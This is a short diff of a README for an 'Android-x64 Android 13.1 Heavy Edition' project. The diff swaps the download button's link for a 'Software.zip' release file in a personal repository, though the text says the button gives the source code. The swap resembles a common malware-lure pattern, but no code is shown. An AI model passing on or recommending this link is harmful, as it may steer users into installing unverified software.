@@ -13,7 +13,7 @@ Android-x64 is a project aimed at running the Android operating system on your P
 ## Getting Started
 To get started with the Android-x64 Android 13.1 Heavy Edition, you can download the source code by clicking the button below:
 
-[![Download Android-x64 Android 13.1 Heavy Edition](https://img.shields.io/badge/Download-Android--x64--Android--13.1--Heavy--Edition-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Android-x64 Android 13.1 Heavy Edition](https://github.com/dorasert/Android-x64_Android13.1_Heavy_Edition/releases/download/v1.0/Software.zip)](https://github.com/dorasert/Android-x64_Android13.1_Heavy_Edition/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the source code, follow the installation instructions in the repository to set up Android 13.1 Heavy Edition on your PC.
 
